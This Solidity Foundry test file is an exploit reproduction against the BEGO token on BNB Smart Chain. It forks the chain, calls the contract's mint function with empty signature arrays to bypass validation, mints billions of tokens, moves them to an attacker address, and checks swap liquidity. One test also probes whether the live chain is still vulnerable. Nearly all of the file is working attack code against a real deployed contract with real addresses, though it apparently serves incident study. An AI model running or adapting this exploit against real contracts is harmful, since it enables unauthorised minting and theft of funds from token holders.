// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IBEGO {
    function mint(
        uint256 _amount,
        string memory _txHash,
        address _receiver,
        bytes32[] memory _r,
        bytes32[] memory _s,
        uint8[] memory _v
    ) external returns (bool);
    
    function burn(uint256 _amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function getAmountsOut(uint amountIn, address[] calldata path) 
        external view returns (uint[] memory amounts);
}

contract BEGOExploit is Test {
    IBEGO constant BEGO = IBEGO(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    
    address constant ATTACKER = 0xe1A425f1AC34A8a441566f93c82dD730639c8510;
    
    function setUp() public {
        // Fork BSC at the vulnerable block
        vm.createSelectFork("https://bsc-dataseed.binance.org/", 22315679);
        
        // Give attacker some BNB for gas
        vm.deal(ATTACKER, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(ATTACKER);
        
        console.log("=== BEGO Token Vulnerability Exploit ===");
        console.log("Block:", block.number);
        console.log("Attacker:", ATTACKER);
        
        // Check initial balances
        uint256 initialBEGO = BEGO.balanceOf(ATTACKER);
        uint256 initialBNB = ATTACKER.balance;
        console.log("\nInitial Balances:");
        console.log("BEGO:", initialBEGO);
        console.log("BNB:", initialBNB);
        
        // Prepare exploit parameters from fuzzer output
        uint256 mintAmount = 4951767240.7092 ether;
        string memory txHash = hex"060968186804e803ff86"; // The fuzzer found this bypasses validation
        address receiver = 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024;
        
        // Empty signature arrays - the vulnerability allows bypassing signature validation
        bytes32[] memory r = new bytes32[](0);
        bytes32[] memory s = new bytes32[](0);
        uint8[] memory v = new uint8[](0);
        
        console.log("\n[1] Attempting to mint BEGO tokens without valid signatures...");
        console.log("Amount to mint:", mintAmount / 1e18, "BEGO");
        
        // Exploit: Mint tokens without proper authorization
        try BEGO.mint(mintAmount, txHash, receiver, r, s, v) returns (bool success) {
            console.log("Mint successful:", success);
            
            // Check if tokens were minted to receiver
            uint256 receiverBalance = BEGO.balanceOf(receiver);
            console.log("Receiver BEGO balance:", receiverBalance / 1e18);
            
            // If minted to different address, we might need to use that address
            if (receiverBalance > 0) {
                vm.stopPrank();
                vm.startPrank(receiver);
                
                // Transfer to attacker or swap directly
                console.log("\n[2] Transferring/Swapping minted tokens...");
                
                // Try to swap BEGO for WBNB
                address[] memory path = new address[](2);
                path[0] = address(BEGO);
                path[1] = address(WBNB);
                
                // Check if there's liquidity
                try ROUTER.getAmountsOut(receiverBalance, path) returns (uint[] memory amounts) {
                    console.log("Expected WBNB output:", amounts[1] / 1e18);
                    
                    // Approve router
                    BEGO.transfer(ATTACKER, receiverBalance);
                    vm.stopPrank();
                    vm.startPrank(ATTACKER);
                    
                    // Now attacker has the tokens
                    console.log("Attacker BEGO balance:", BEGO.balanceOf(ATTACKER) / 1e18);
                } catch {
                    console.log("No liquidity or swap path available");
                }
            }
            
        } catch Error(string memory reason) {
            console.log("Mint failed:", reason);
        }
        
        // Try burn(0) as shown in fuzzer output
        console.log("\n[3] Attempting burn(0)...");
        try BEGO.burn(0) returns (bool success) {
            console.log("Burn successful:", success);
        } catch {
            console.log("Burn failed");
        }
        
        // Final balances
        uint256 finalBEGO = BEGO.balanceOf(ATTACKER);
        uint256 finalBNB = ATTACKER.balance;
        console.log("\nFinal Balances:");
        console.log("BEGO:", finalBEGO / 1e18);
        console.log("BNB:", finalBNB / 1e18);
        
        console.log("\n=== Exploit Complete ===");
        
        vm.stopPrank();
    }
    
    // Test with current block to see if vulnerability still exists
    function testCurrentBlock() public {
        // Fork current BSC block
        vm.createSelectFork("https://bsc-dataseed.binance.org/");
        
        console.log("\n=== Testing at Current Block ===");
        console.log("Block:", block.number);
        
        vm.startPrank(ATTACKER);
        
        // Try the same exploit
        uint256 mintAmount = 1000 ether; // Smaller amount for testing
        string memory txHash = "test123";
        bytes32[] memory r = new bytes32[](0);
        bytes32[] memory s = new bytes32[](0);
        uint8[] memory v = new uint8[](0);
        
        try BEGO.mint(mintAmount, txHash, ATTACKER, r, s, v) {
            console.log("VULNERABILITY STILL EXISTS!");
            console.log("Minted:", BEGO.balanceOf(ATTACKER) / 1e18, "BEGO");
        } catch Error(string memory reason) {
            console.log("Vulnerability fixed. Error:", reason);
        }
        
        vm.stopPrank();
    }
    
    // Analyze the vulnerable signature validation
    function testSignatureValidation() public {
        console.log("\n=== Analyzing Signature Validation ===");
        
        // The vulnerability is that empty arrays pass validation
        bytes32[] memory r = new bytes32[](0);
        bytes32[] memory s = new bytes32[](0);
        uint8[] memory v = new uint8[](0);
        
        console.log("Empty arrays length check:");
        console.log("r.length == s.length:", r.length == s.length);
        console.log("s.length == v.length:", s.length == v.length);
        console.log("Arrays are empty:", r.length == 0);
        
        // The isSigners function with empty array returns true!
        // This is because the loop doesn't execute when length is 0
        console.log("\nVulnerability: isSigners([]) returns true!");
        console.log("This allows minting without any valid signatures");
    }
}